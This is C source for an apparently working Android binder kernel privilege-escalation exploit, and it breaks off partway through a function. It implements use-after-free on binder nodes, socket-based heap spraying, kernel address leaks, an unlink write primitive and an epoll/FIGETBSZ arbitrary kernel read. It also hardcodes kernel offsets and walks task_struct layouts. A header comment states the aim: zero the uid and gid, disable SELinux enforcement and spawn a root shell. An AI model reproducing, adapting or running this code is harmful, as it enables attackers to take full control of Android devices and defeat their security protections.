#include "binder_client.h"
#define _GNU_SOURCE
#include <unistd.h>
#include <stdio.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <string.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sched.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <sys/epoll.h>
#include <sys/uio.h>
#include <limits.h>
#include <sys/eventfd.h>
#include <sys/timerfd.h>
#include <assert.h>
#include <sys/xattr.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <errno.h>
#include <sys/prctl.h>
#include <sys/sendfile.h>
#include <linux/fs.h>
#include <stdlib.h>
#include <pthread.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include "binder.h"
#include "exploit.h"
#include "util.h"


// Exploit plan:
// Spray messages back and forth, to get fragmented binder allocator
//   TODO: figure out how to do this
//
// UAF on many binder nodes
//
// Then cross cache attack with epitem
//   allocate 2 epitem per fd, try to leak first one to get leak on file and second epitem
//
// UAF on binder node, reclaim with binder ref referencing another node
//   read dangling message to leak other node
//
// UAF on other node we leaked
//   reclaim with fake msg_msg which will overwrite
//   msg_msg will have linked list setup to unlink overwrite one of file inode pointers to epitem
//
// Now arbitrary read is set up
//   leak file f_ops vtable pointer from known address
//   traverse process list with arb read to find target process
//
// perform unlink setup more times
//   overwrite uid and gid to 0
//   set selinux.enforcing to 0
//
// exec shell

struct list_head { 
    struct list_head *next, *prev; 
}; 

struct hlist_head { 
    struct hlist_node *first; 
}; 

struct hlist_node { 
    struct hlist_node *next, **pprev; 
};

struct rb_node {
    unsigned long  __rb_parent_color;
    struct rb_node *rb_right;
    struct rb_node *rb_left;
} __attribute__((aligned(sizeof(long))));

struct rb_root {
    struct rb_node *rb_node;
};

struct binder_work {
    struct list_head entry;

    enum binder_work_type {
        BINDER_WORK_TRANSACTION = 1,
        BINDER_WORK_TRANSACTION_COMPLETE,
        BINDER_WORK_TRANSACTION_ONEWAY_SPAM_SUSPECT,
        BINDER_WORK_RETURN_ERROR,
        BINDER_WORK_NODE,
        BINDER_WORK_DEAD_BINDER,
        BINDER_WORK_DEAD_BINDER_AND_CLEAR,
        BINDER_WORK_CLEAR_DEATH_NOTIFICATION,
    } type;
};

struct binder_node {
	int debug_id;
	//spinlock_t lock;
    // TODO: figure out if this is correct (should be based on offset of ptr and cookie)
    u32 lock;
	struct binder_work work;
	union {
		struct rb_node rb_node;
		struct hlist_node dead_node;
	};
	struct binder_proc *proc;
	struct hlist_head refs;
	int internal_strong_refs;
	int local_weak_refs;
	int local_strong_refs;
	int tmp_refs;
    // Offset 88 and 96
	binder_uintptr_t ptr;
	binder_uintptr_t cookie;
	struct {
		/*
		* bitfield elements protected by
		* proc inner_lock
		*/
		u8 has_strong_ref:1;
		u8 pending_strong_ref:1;
		u8 has_weak_ref:1;
		u8 pending_weak_ref:1;
	};
	struct {
		/*
		* invariant after initialization
		*/
		u8 sched_policy:2;
		u8 inherit_rt:1;
		u8 accept_fds:1;
		u8 txn_security_ctx:1;
		u8 min_priority;
	};
	bool has_async_transaction;
	struct list_head async_todo;
};

struct binder_proc {
        struct hlist_node proc_node;
        struct rb_root threads;
        struct rb_root nodes;
        struct rb_root refs_by_desc;
        struct rb_root refs_by_node;
        struct list_head waiting_threads;
        int pid;
        struct task_struct *tsk;
        const struct cred *cred;
        struct hlist_node deferred_work_node;
        int deferred_work;
        int outstanding_txns;
        // stuff after doesn't matter
        // bool is_dead;
        // bool is_frozen;
        // bool sync_recv;
        // bool async_recv;
        // wait_queue_head_t freeze_wait;

        // struct list_head todo;
        // struct binder_stats stats;
        // struct list_head delivered_death;
        // int max_threads;
        // int requested_threads;
        // int requested_threads_started;
        // int tmp_ref;
        // struct binder_priority default_priority;
        // struct dentry *debugfs_entry;
        // struct binder_alloc alloc;
        // struct binder_context *context;
        // spinlock_t inner_lock;
        // spinlock_t outer_lock;
        // struct dentry *binderfs_entry;
        // bool oneway_spam_detection_enabled;
};


void command_pipe_init(CommandPipe *command_pipe) {
    int fds[2] = { 0 };
    SYSCHK(pipe(fds));

    command_pipe->send_command_pipe = fds[1];
    command_pipe->recv_command_pipe = fds[0];

    SYSCHK(pipe(fds));
    command_pipe->send_response_pipe = fds[1];
    command_pipe->recv_response_pipe = fds[0];
}

void init_shared_barrier(pthread_barrier_t *b, int count) {
    pthread_barrierattr_t attr;
    pthread_barrierattr_init(&attr);
    pthread_barrierattr_setpshared(&attr, PTHREAD_PROCESS_SHARED);
    pthread_barrier_init(b, &attr, count);
}

void exploit_ctx_init(ExploitCtx *ctx) {
    memset(ctx, 0, sizeof(ExploitCtx));

    command_pipe_init(&ctx->b_pipe);
    command_pipe_init(&ctx->c_pipe);
    command_pipe_init(&ctx->d_pipe);

    init_shared_barrier(&ctx->a_register_done, 3);
}

typedef enum {
    // b commands
    UAF_NODE,

    // c commands
    RECV_NODE,
    RESET_CONTEXT,
    ACQUIRE_CONTEXT,
    // for prepping binder allocator layout for cross cache
    SEND_EMPTY,
    SEND_NODE,
} CommandType;

typedef struct {
    binder_uintptr_t base_id;
    u64 node_count;
    bool use_async;
} UafNodeArgs;

typedef struct {
    CommandType command_type;
    u32 body_size;
} PipeCommandHeader;

typedef struct {
    PipeCommandHeader header;
    void *data;
} PipeCommand;

void send_pipe_command(CommandPipe *ctx, PipeCommand *command) {
    write(ctx->send_command_pipe, &command->header, sizeof(PipeCommandHeader));
    if (command->data) {
        write(ctx->send_command_pipe, command->data, command->header.body_size);
    }
}

// sends only a command type with no body
void send_pipe_command_type(CommandPipe *ctx, CommandType command_type) {
    PipeCommand command = {
        .header = {
            .command_type = command_type,
            .body_size = 0,
        },
        .data = NULL,
    };

    send_pipe_command(ctx, &command);
}

PipeCommand recv_pipe_command(CommandPipe *ctx) {
    PipeCommand out = { 0 };
    read(ctx->recv_command_pipe, &out.header, sizeof(PipeCommandHeader));

    if (out.header.body_size > 0) {
        out.data = calloc(out.header.body_size, sizeof(u8));
        read(ctx->recv_command_pipe, out.data, out.header.body_size);
    } else {
        out.data = NULL;
    }

    return out;
}

void pipe_command_drop(PipeCommand command) {
    if (command.data) {
        free(command.data);
    }
}

typedef enum {
    COMMAND_OK,
    COMMAND_ERROR,
} PipeCommandResponse;

void send_command_response(CommandPipe *ctx, PipeCommandResponse response) {
    assert(write(ctx->send_response_pipe, &response, sizeof(PipeCommandResponse)) == sizeof(PipeCommandResponse));
}

void await_response(CommandPipe *ctx) {
    PipeCommandResponse response = COMMAND_ERROR;
    read(ctx->recv_response_pipe, &response, sizeof(PipeCommandResponse));
    if (response != COMMAND_OK) {
        panic("Received error response from pipe command");
    }
}

void uaf_nodes(LocalCtx *ctx, binder_uintptr_t base_id, u64 node_count, bool use_async);
void uaf_flush_read(LocalCtx *ctx, u64 node_count);
void process_a_register(LocalCtx *ctx);
void process_a_deregister(LocalCtx *ctx);

#undef PAGE_SIZE
#define PAGE_SIZE (0x1000)

#define PROCESS_A_BINDER 20
#define PROCESS_B_BINDER 40

#define VULN_BINDER 1337

#define SEND_COOKIE 0x69696969

// creates an empty binder reply and sends it
// used to pop message off of transaction stack, so more messages can be sent
void empty_reply(int binder_fd) {
    char read_buf[128] = { 0 };
    usize read_amount = 0;

    struct binder_txn *reply_txn = binder_txn_create(0, 0, 0);
    binder_txn_dispatch(reply_txn, binder_fd, true, NULL, 0, NULL);
    binder_txn_destroy(reply_txn);

    // read transaction complete workqueu item
    binder_read(binder_fd, read_buf, sizeof(read_buf), &read_amount);
    // binder_read_buffer_dump(read_buf, read_amount);
}

// sends a node with the given node number to the recepient process
void send_node(binder_client_t *binder, u32 remote_handle, binder_uintptr_t node_num, bool read_reponse) {
    struct binder_txn *txn = binder_txn_create(remote_handle, 0, TF_ONE_WAY);
    binder_txn_add_binder_object(txn, node_num, SEND_COOKIE);

    int ret = binder_txn_dispatch(txn, binder->fd, false, NULL, 0, NULL);
    if (ret < 0) {
        panic("Failed to send node to other process");
    }

    binder_txn_destroy(txn);

    // receive response for transaction (don't do anything with it)
    u8 read_buf[256] = { 0 };
    usize read_amount = 0;

    if (read_reponse) {
        binder_read(binder->fd, read_buf, sizeof(read_buf), &read_amount);
        // LOGD("send node buffer dump");
        // binder_read_buffer_dump(read_buf, read_amount);
    }
    // void *thing = NULL;
    // TODO: figure out if there is some transaction buffer we have to free when reading response
    // ret = binder_read_buffer_lookup(read_buf, read_amount, BR_INCREFS, &thing);
    // if (ret == 0) {
    //     binder_increfs_done(binder->fd, node_num, 0x69696969);
    // }

    // ret = binder_read_buffer_lookup(read_buf, read_amount, BR_ACQUIRE, &thing);
    // if (ret == 0) {
    //     binder_acquire_done(binder->fd, node_num, 0x69696969);
    // }
}

// receives a handle to a node
u32 recv_strong_handle(binder_client_t *binder, u64 reply_handle) {
    u8 read_buf[256] = { 0 };
    usize read_amount = 0;

    struct binder_transaction_data *txn;
    for (;;) {
        // LOGD("recv read");
        binder_read(binder->fd, read_buf, sizeof(read_buf), &read_amount);
        // LOGD("recv after read");
        // binder_read_buffer_dump(read_buf, read_amount);
        
        int ret = binder_read_buffer_lookup(read_buf, read_amount, BR_TRANSACTION, (void **) &txn);
        if (ret < 0) {
            LOGD("rev_strong_handle: skipping read result with no transaction");
        } else {
            break;
        }
    }

    // LOGD("recv strong handle, node id: %llu, node cookie: %llu", txn->target.ptr, txn->cookie);

    binder_uintptr_t *offsets = (binder_uintptr_t *) txn->data.ptr.offsets;
    usize num_offsets = txn->offsets_size / sizeof(binder_uintptr_t);

    for (usize i = 0; i < num_offsets; i++) {
        struct flat_binder_object *object = (struct flat_binder_object *) (txn->data.ptr.buffer + offsets[i]);
        // LOGD("header type: %u", object->hdr.type);
        if (object->hdr.type == BINDER_TYPE_HANDLE) {
            u32 handle = object->handle;

            binder_acquire(binder->fd, handle);
            binder_increfs(binder->fd, handle);
            binder_free_transaction_buffer(binder->fd, txn->data.ptr.buffer);

            return handle;
        }
    }

    panic("No handle found");
}

// NOTE: doesn't read reply, because this is used in uaf_nodes, where we don't want to read the reply yet
void send_multiple_nodes(binder_client_t *binder, u32 remote_handle, binder_uintptr_t base_node_num, u32 node_count) {
    struct binder_txn *txn = binder_txn_create(remote_handle, 0, 0);
    for (usize i = 0; i < node_count; i++) {
        binder_txn_add_binder_object(txn, base_node_num + i, SEND_COOKIE);
    }

    int ret = binder_txn_dispatch(txn, binder->fd, false, NULL, 0, NULL);
    if (ret < 0) {
        panic("Failed to send node to other process");
    }

    binder_txn_destroy(txn);
}

void recv_multiple_nodes(binder_client_t *binder, u32 *ref_array, u32 node_count) {
    u8 read_buf[1024] = { 0 };
    usize read_amount = 0;

    struct binder_transaction_data *txn;
    for (;;) {
        binder_read(binder->fd, read_buf, sizeof(read_buf), &read_amount);
        
        int ret = binder_read_buffer_lookup(read_buf, read_amount, BR_TRANSACTION, (void **) &txn);
        if (ret < 0) {
            LOGD("recv_multiple_nodes: skipping read result with no transaction");
        } else {
            break;
        }
    }

    binder_uintptr_t *offsets = (binder_uintptr_t *) txn->data.ptr.offsets;
    usize num_offsets = txn->offsets_size / sizeof(binder_uintptr_t);
    usize node_index = 0;

    for (usize i = 0; i < num_offsets; i++) {
        struct flat_binder_object *object = (struct flat_binder_object *) (txn->data.ptr.buffer + offsets[i]);
        if (object->hdr.type == BINDER_TYPE_HANDLE) {
            u32 handle = object->handle;

            binder_acquire(binder->fd, handle);
            binder_increfs(binder->fd, handle);

            if (node_index >= node_count) {
                panic("recv_multiple_nodes: received too many nodes");
            }
            ref_array[node_index] = handle;
            node_index += 1;
        }
    }

    if (node_index != node_count) {
        panic("recv_multiple_nodes: Did not receive enough nodes");
    }

    binder_free_transaction_buffer(binder->fd, txn->data.ptr.buffer);
    empty_reply(binder->fd);
}

void allocate_node(LocalCtx *ctx, binder_uintptr_t node_id, bool read_reponse, bool allocate_forever) {
    CommandPipe *pipe = allocate_forever ? &ctx->ctx->d_pipe : &ctx->ctx->c_pipe;
    u32 handle = allocate_forever ? ctx->d_handle : ctx->c_handle;

    send_pipe_command_type(pipe, RECV_NODE);
    send_node(&ctx->binder, handle, node_id, read_reponse);
    await_response(pipe);
}

void reset_process_c(LocalCtx *ctx) {
    send_pipe_command_type(&ctx->ctx->c_pipe, RESET_CONTEXT);
    await_response(&ctx->ctx->c_pipe);
}

void connect_process_c(LocalCtx *ctx) {
    send_pipe_command_type(&ctx->ctx->c_pipe, ACQUIRE_CONTEXT);
    ctx->c_handle = recv_strong_handle(&ctx->binder, -1);
    LOGD("A: received C's handle");
    await_response(&ctx->ctx->c_pipe);
}

void connect_process_d(LocalCtx *ctx) {
    send_pipe_command_type(&ctx->ctx->d_pipe, ACQUIRE_CONTEXT);
    ctx->d_handle = recv_strong_handle(&ctx->binder, -1);
    LOGD("A: received C's handle");
    await_response(&ctx->ctx->d_pipe);
}

#define NUM_SPRAY 16

// sendmsg spray adapted from CVE-2023-3609 exploit
// payload to send on socket
u8 dummy_buf[0x1000] = { 0 };

// payload sprayed to overlap with 
u8 payload[128] = { 0 };

int control_socket[2] = { 0 };
int spray_sockets[NUM_SPRAY][2] = { 0 };


void *spray_thread(void *x) {
    size_t index = (size_t)x;
    write(control_socket[0], dummy_buf, 1);
    read(control_socket[0], dummy_buf, 1);
    pin_to_cpu(0);

    struct iovec iov = {
        .iov_base = dummy_buf,
        .iov_len = sizeof(dummy_buf),
    };

    struct msghdr msg = {
        .msg_iov = &iov,
        .msg_iovlen = 1,
        .msg_control = payload,
        .msg_controllen = sizeof(payload),
    };

    sendmsg(spray_sockets[index][1], &msg, 0);

    return NULL;
}

void setup_spray() {
    SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, control_socket));

    memset(payload, 0, sizeof(payload));
    memset(dummy_buf, 0, sizeof(dummy_buf));

    struct cmsghdr *control_header = (struct cmsghdr *) &payload[0];
    control_header->cmsg_len = sizeof(payload);
    control_header->cmsg_level = 0;
    control_header->cmsg_type = 0;

    for (usize i = 0; i < NUM_SPRAY; i++) {
        SYSCHK(socketpair(AF_UNIX, SOCK_DGRAM, 0, spray_sockets[i]));

        u32 buf_size = 0x800;
        SYSCHK(setsockopt(spray_sockets[i][1], SOL_SOCKET, SO_SNDBUF, (char *)&buf_size, sizeof(buf_size)));
        SYSCHK(setsockopt(spray_sockets[i][0], SOL_SOCKET, SO_RCVBUF, (char *)&buf_size, sizeof(buf_size)));
        write(spray_sockets[i][1], dummy_buf, sizeof(dummy_buf));
    }

    pthread_t tid = 0;
    for (usize i = 0; i < NUM_SPRAY; i++) {
        pthread_create(&tid, 0, spray_thread, (void *)i);
        pthread_detach(tid);
    }

    // wait for threads to get setup
    int to_read = NUM_SPRAY;
    while (to_read > 0) {
        to_read -= read(control_socket[1], dummy_buf, NUM_SPRAY);
    }
}

void do_spray() {
    write(control_socket[1], dummy_buf, NUM_SPRAY);
    // wait for spray to finish
    // cant really use barrier cause threads will indefinately block in sendmsg
    // so they can't signal after they are done
    sleep(1);
}

// cleans up resrouces used during spray
void reset_spray() {
    for (usize i = 0; i < NUM_SPRAY; i++) {
        read(spray_sockets[i][0], dummy_buf, sizeof(dummy_buf));
        SYSCHK(close(spray_sockets[i][0]));
        SYSCHK(close(spray_sockets[i][1]));
    }

    SYSCHK(close(control_socket[0]));
    SYSCHK(close(control_socket[1]));
}

void await_thread(void *(*thread_fn)(void *value), void *value) {
    // momentarily pin to another CPU so allocations for creating new thread are serviced from different kmalloc cache
    // TODO: don't do this (preastart threads) so that exploit can still work with 1 cpu core
    pin_to_cpu(1);
    pthread_t thread = 0;
    SYSCHK(pthread_create(&thread, 0, thread_fn, value));
    SYSCHK(pthread_join(thread, NULL));
    pin_to_cpu(0);
}

void detach_thread(void *(*thread_fn)(void *value), void *value) {
    // momentarily pin to another CPU so allocations for creating new thread are serviced from different kmalloc cache
    // TODO: don't do this (preastart threads) so that exploit can still work with 1 cpu core
    pin_to_cpu(1);
    pthread_t thread = 0;
    SYSCHK(pthread_create(&thread, 0, thread_fn, value));
    SYSCHK(pthread_detach(thread));
    pin_to_cpu(0);
}

// allocates node in another thread, so inc ref count work queue item is never processed in main thread
void *allocate_node_thread(void *ctx_void) {
    pin_to_cpu(0);
    LocalCtx *ctx = (LocalCtx *) ctx_void;
    allocate_node(ctx, ctx->allocate_node_id, false, ctx->allocate_node_forever);
    return NULL;
}

typedef struct {
    int binder_fd;
    struct binder_txn *txn;
    pthread_barrier_t barrier;
} SyncTxnDispatchData;

void *sync_txn_dispatch_thread(void *sync_msg_data) {
    pin_to_cpu(0);
    SyncTxnDispatchData *data = (SyncTxnDispatchData *) sync_msg_data;

    binder_enter_looper(data->binder_fd);
    binder_txn_dispatch(data->txn, data->binder_fd, false, NULL, 0, NULL);

    pthread_barrier_wait(&data->barrier);

    pin_to_cpu(1);

    // sleep for a while so transaction processes, so other process doesn't get dead reply
    // can't use binder_read cause binder is goofy with multiple threads
    // sleep(10);

    // // wait for transaction to finish
    // u8 read_buf[256] = { 0 };
    // usize read_amount = 0;

    // for (;;) {
    //     binder_read(data->binder_fd, read_buf, sizeof(read_buf), &read_amount);
    //     int ret = binder_read_buffer_lookup(read_buf, read_amount, BR_TRANSACTION_COMPLETE, NULL);

    //     if (ret < 0) {
    //         LOGD("sync_txn_dispatch_thread: Skipping result which is not transaction finished");
    //     } else {
    //         break;
    //     }
    // }

    return NULL;
}

// dispatches a syncrhonous transaction on another thread, so it doesn't interfare with transaction stack
void sync_txn_dispatch(int binder_fd, struct binder_txn *txn) {
    SyncTxnDispatchData data = {
        .binder_fd = binder_fd,
        .txn = txn,
    };

    pthread_barrier_init(&data.barrier, NULL, 2);

    detach_thread(sync_txn_dispatch_thread, &data);

    pthread_barrier_wait(&data.barrier);
    pthread_barrier_destroy(&data.barrier);
}

binder_uintptr_t allocate_from_process_c(LocalCtx *ctx, CommandType command) {
    send_pipe_command_type(&ctx->ctx->c_pipe, command);

    u8 read_buf[256] = { 0 };
    usize read_amount = 0;

    struct binder_transaction_data *txn;
    for (;;) {
        binder_read(ctx->binder.fd, read_buf, sizeof(read_buf), &read_amount);
        
        int ret = binder_read_buffer_lookup(read_buf, read_amount, BR_TRANSACTION, (void **) &txn);
        if (ret < 0) {
            LOGD("allocate: skipping read result with no transaction");
        } else {
            break;
        }
    }

    empty_reply(ctx->binder.fd);

    await_response(&ctx->ctx->c_pipe);

    return txn->data.ptr.buffer;
}

binder_uintptr_t allocate_empty(LocalCtx *ctx) {
    return allocate_from_process_c(ctx, SEND_EMPTY);
}

binder_uintptr_t allocate_ref(LocalCtx *ctx) {
    return allocate_from_process_c(ctx, SEND_NODE);
}

bool looks_like_kernel_pointer(usize value) {
    return value > 0xffffff8000000000;
}

#define UAF_PTR 123456789
#define UAF_COOKIE 987654321

#define BUFFER_GAP_COUNT 5000
// The original exploit uses 1600 nodes and 28 files
// The old values didn't work for me, so I just increased them and now they work
#define SPRAY_NODE_COUNT 4096
#define FILE_COUNT 1024
#define SPRAY_EPITEM_COUNT (FILE_COUNT * 2)

#define SPRAY_BASE_ID 10000000

#define EP_ITEM_LIST_HEAD_OFFSET 88
// offset from start of epitem struct to 8 bytes controlled by user
#define EP_ITEM_USER_DATA_OFFSET 120

// right before list head
#define FILE_PRIVATE_DATA_OFFSET 0xd8
// based of decompilation of `eventpoll_release_file` function, which accesses f_ep_links field
#define FILE_LIST_HEAD_OFFSET 0xe0
// based off decompilation of `do_vfs_ioctl`
#define FILE_INODE_OFFSET 0x20
#define FILE_FOPS_VTABLE_OFFSET 0x28

#define KERNEL_START ((u64) 0xffffffc010000000)

// offset for android13-5.10-2022-06_debug kernel on cuttlefish server
#define TIMERFD_FOPS_OFFSET ((u64) 0xffffffc012027020 - KERNEL_START)
#define INIT_TASK_OFFSET ((u64) 0xffffffc012ccc540 - KERNEL_START)

#define BLOCK_SIZE_OFFSET 24

// number of UAF nodes that are used to leak the address of the node we will reclaim
#define UNLINK_LEAK_UAF_COUNT 8

// TODO: clean up code, currently override meaning with leak_only flag
u64 try_mem_unlink(LocalCtx *ctx, usize prev_addr, usize next_addr, bool leak_only) {
    if (!leak_only) {
        setup_spray();
    }

    u8 read_buf[4096] = { 0 };
    usize read_amount = 0;

    usize leak_addr = 0;
    binder_uintptr_t leaked_node_id = 0;
    static usize iteration = 0;
    for (;;) {
        uaf_nodes(ctx, 1337 + iteration, 1, true);
        uaf_flush_read(ctx, 1);

        // we need to allocate node to reclaim UAF node with ref
        // issue is if we allocate node, when we read in message pointing to freed node to get leak, we will
        // read in message acknowledging refcount incrament, which will put node in state where it can be later UAF
        // this is because this workqueue item goes per thread and the async message goes in a list
        // which is read later (so this refcount message will be read first)
        // so we spawn a new thread to do the work, and the workqueue item will go to that thread
        // and it will never read it, so it is possible to UAF this node later
        leaked_node_id = 80000 + iteration;
        ctx->allocate_node_id = leaked_node_id;
        // if we are leaking node address, node needs to stay around for a while
        ctx->allocate_node_forever = leak_only;
        await_thread(allocate_node_thread, ctx);

        LOGD("================ UNLINK UAF ================");
        binder_read(ctx->binder.fd, read_buf, sizeof(read_buf), &read_amount);
        LOGD("read length: %llu", read_amount);
        binder_read_buffer_dump(read_buf, read_amount);
        struct binder_transaction_data *response = NULL;
        int ret = binder_read_buffer_lookup(read_buf, read_amount, BR_TRANSACTION, (void **) &response);
        if (ret < 0) {
            panic("Didn't receive response");
        }

        LOGD("recv node: %llu, recv cookie: %lu, offset size: %lu", response->target.ptr, response->cookie, response->offsets_size);

        empty_reply(ctx->binder.fd);

        iteration++;

        // if target value looks like heap pointer, go next
        // cookie should also be 0, because NULL pointer is stored after in ref
        // if it is not 0, we leaked the wrong thing
        if (looks_like_kernel_pointer(response->target.ptr) && response->cookie == 0) {
            leak_addr = response->target.ptr;
            break;
        } else {
            LOGD("retry leak...");
            // avoid allocating excesive amount of nodes
            reset_process_c(ctx);
            connect_process_c(ctx);
            sleep(1);
            // FIXME: retries have -1 refcount for some reason
            // return;
        }
    }

    LOGD("================ UNLINK LEAK ================");
    LOGD("Got leak on binder node %d: %p\n\n", leaked_node_id, leak_addr);
    // FIXME: leak seems to be slightly wrong
    // trial 1
    // real value:   0xffffff8075966100
    // leaked value: 0xffffff8075968600
    // trial 2
    // real value:   0xffffff8075966100
    // leaked value: 0xffffff801d72f200

    if (leak_only) {
        return leak_addr;
    }

    // set up payload to spray
    usize list_offset = offsetof(struct binder_node, work);
    struct binder_node *node = (struct binder_node *) payload;
    // last decrament will free
    node->local_strong_refs = 1;
    node->work.entry.next = leak_addr + list_offset;
    node->dead_node.next = (struct hlist_node *) next_addr;
    node->dead_node.pprev = (struct hlist_node **) prev_addr;
    node->refs.first = NULL;
    node->proc = NULL;
    node->cookie = UAF_COOKIE;
    node->ptr = UAF_PTR;

    // now uaf the node we know its address
    // this one can't be async because buffer release needs to be a non async buffer
    uaf_nodes(ctx, leaked_node_id, 1, false);
    reset_process_c(ctx);
    LOGD("A: reset C");
    // binder frees binder proc later using linux workqueue
    // wait for the workqueue item to run to make sure it is free before
    // we read in BR_INCREF and BR_ACQUIRE codes which wil incrament local refcount
    sleep(1);
    // can't read increfs until after node dropped in process c
    uaf_flush_read(ctx, 1);

    // reclaim freed node
    do_spray();

    LOGD("================ UNLINK UAF2 ================");
    binder_read(ctx->binder.fd, read_buf, sizeof(read_buf), &read_amount);
    LOGD("read length: %llu", read_amount);
    binder_read_buffer_dump(read_buf, read_amount);
    struct binder_transaction_data *response = NULL;
    int ret = binder_read_buffer_lookup(read_buf, read_amount, BR_TRANSACTION, (void **) &response);
    if (ret < 0) {
        panic("Didn't receive response");
    }

    LOGD("recv node: %llu, recv cookie: %lu, offset size: %lu", response->target.ptr, response->cookie, response->offsets_size);

    empty_reply(ctx->binder.fd);

    if (response->target.ptr == UAF_PTR && response->cookie == UAF_COOKIE) {
        sleep(1);
        // triggers unlink primtive (but maybe unreliable?)
        binder_free_transaction_buffer(ctx->binder.fd, response->data.ptr.buffer);
        reset_spray();
        connect_process_c(ctx);
        return 1;
    } else {
        reset_spray();
        connect_process_c(ctx);
        return 0;
    }
}

// performs the following operation in kernel memory:
// *((usize *) prev_addr) = next_addr
// *((usize *) next_addr + 8) = prev_addr
// the second write is not performed if next_addr is 0
void mem_unlink(LocalCtx *ctx, usize prev_addr, usize next_addr) {
    process_a_register(ctx);
    while (!try_mem_unlink(ctx, prev_addr, next_addr, false)) {
        LOGD("unlink failed, retrying...");
    }
    process_a_deregister(ctx);
}

// performs the following operation in kernel memory:
// *((usize *) address) = 0
void zero_address(LocalCtx *ctx, usize address) {
    mem_unlink(ctx, address, 0);
}

u32 read_u32(LocalCtx *ctx, usize address) {
    if (address != address & ~0b11) {
        LOGD("address: 0x%lx", address);
        panic("Unaligned read");
    }

    struct epoll_event events = {
        // make events not 0 so epoll doesn't ignore
        // idt that is a thing but just in case
        .events = EPOLLIN,
        .data = { .u64 = address - BLOCK_SIZE_OFFSET },
    };
    SYSCHK(epoll_ctl(ctx->epoll_fd, EPOLL_CTL_MOD, ctx->leak_fd, &events));

    u32 leak_value = 0;
    if (ioctl(ctx->leak_fd, FIGETBSZ, &leak_value) < 0) {
        // if value is 0, ioctl returns error code
        return 0;
    }

    return leak_value;
}

u64 read_u64(LocalCtx *ctx, usize address) {
    return ((u64) read_u32(ctx, address)) | (((u64) read_u32(ctx, address + 4)) << 32);
}

void kread(LocalCtx *ctx, u64 address, u8 *buf, usize size) {
    for (usize i = 0; i < size; i += 4) {
        u32 val = read_u32(ctx, address + i);

        memcpy(buf + i, &val, MIN(size - i, sizeof(u32)));
    }
}

#define TASK_SIZE 0x3000

// from badspin
int find_task_struct_offsets(LocalCtx *rw) {
    u64 init_task = rw->kernel_base + INIT_TASK_OFFSET;
    u8 init_task_dump[TASK_SIZE];
    u8 tmp_buf[TASK_SIZE];
    bool found_tasks = false;
    bool found_real_parent = false;

    kread(rw, init_task, init_task_dump, TASK_SIZE);

    for (int offset = 0; offset < TASK_SIZE - 8; offset += 8) {
        u64 v1 = *(u64 *)&init_task_dump[offset];
        u64 v2 = *(u64 *)&init_task_dump[offset+8];
        if (!found_real_parent && v1 == init_task && v2 == init_task) {
            /* Found real_parent */
            found_real_parent = true;
            /* Now go backwards until you see 8 bytes all zeroes.
            This accounts for the case CONFIG_STACK_PROTECTOR is not defined. */
            for (int o = offset - 8; o >= 0; o -= 8) {
                u64 pid_tgid = *(u64 *)&init_task_dump[o];
                if (pid_tgid == 0) {
                    rw->task_offsets.ts_pid = o;
                    rw->task_offsets.ts_tgid = o + 4;
                    break;
                }
            }
            // We expect a gap of zeroes of at least 3*2 QWORDs. 
            // (Corresponds to the field `struct hlist_node pid_links[4];`.)
            int nz = 0;
            for (int o = offset + 8 + 8; o < TASK_SIZE - 8; o += 8) {
                u64 u1 = *(u64 *)&init_task_dump[o];
                u64 u2 = *(u64 *)&init_task_dump[o+8];
                if (u1 == 0) {
                    nz++;
                } else if (nz > 0 && nz < 3*2) {
                    // Failed to find thread_group offset.
                    break;
                } else if (nz > 0) {
                    if (u1 == u2 && u1 - o == init_task) {
                        // Offset found.
                        rw->task_offsets.ts_thread_group_next = o;
                        break;
                    }
                }
            }
        }
        if (!found_real_parent && !found_tasks) {
            u64 next = v1, prev = v2;
            if (!looks_like_kernel_pointer(next) || !looks_like_kernel_pointer(prev)) {
                continue;
            }
            /* If it's actually the "next", if we read it and look at the same offset
            for the prev field, we should go back to ourselves..:) */
            kread(rw, next-offset, tmp_buf, TASK_SIZE);
            u64 next_prev = *(u64 *)&tmp_buf[offset + 8];
            if (next_prev - offset == init_task){
                found_tasks = true;
                rw->task_offsets.ts_tasks_next = offset;
            }
        }
    }

    // MODIFIED
    // LOGD("init_task dump");
    // for (size_t i_dump = 0; i_dump < TASK_SIZE; i_dump++) {
    //     LOGD("%02x", init_task_dump[i_dump]);
    // }
    // LOGD("\n");

    /* Now we locate "files". The heuristic is as follows:
    1. First, locate the "comm" field, which is 16 bytes and contains the string "swapper" at the beginning.
    2. After the "comm" field locate the 2nd pointer pointing into the kernel data. (The 1st pointer is "fs".)
    The previous fields should be 0 for the init_task. */
    void *comm_field = memmem(init_task_dump, TASK_SIZE, "swapper", sizeof("swapper")-1);
    if (comm_field == NULL) {
        LOG("Failed to find task_struct->comm offset\n");
        goto exit;
    }
    int np = 0;
    u64 init_files_struct = 0;
    for (int offset = (int)(comm_field-(void *)init_task_dump) + 16; offset < TASK_SIZE; offset += 8) {
        u64 v = *(u64 *)&init_task_dump[offset];
        if ((v & 0xffffffc000000000UL) == 0xffffffc000000000UL) {
            np++;
            if (np == 2) {
                init_files_struct = v;
                rw->task_offsets.ts_files = offset;
                break;
            }
        }
    }

    if (init_files_struct) {
        kread(rw, init_files_struct, tmp_buf, 0x100);
        for (int offset = 0; offset < 0x100; offset += 8) {
            u64 v = *(u64 *)&tmp_buf[offset];
            if (v - (offset + 8) == init_files_struct) {
                rw->task_offsets.fs_fdt = offset;
                break;
            }
        }
    }

    int ts_cred_offset = (int)(comm_field- (void *)init_task_dump) - 16;
    rw->task_offsets.ts_cred = ts_cred_offset;

exit:
    LOG("[x] task_struct offsets:");
    LOG("\ttasks         at  %d", rw->task_offsets.ts_tasks_next);
    LOG("\tpid           at  %d", rw->task_offsets.ts_pid);
    LOG("\ttgid          at  %d", rw->task_offsets.ts_tgid);
    LOG("\tthread_group  at  %d", rw->task_offsets.ts_thread_group_next);
    LOG("\tfiles         at  %d", rw->task_offsets.ts_files);
    LOG("\tcred          at  %d", rw->task_offsets.ts_cred);

    LOG("[x] files_struct offsets:");
    LOG("\tfdt           at  %d", rw->task_offsets.fs_fdt);

    return 0;
}

void comm_fd_set_buffer(int fd, u8 *buf, usize index) {
    if (index == 8) {
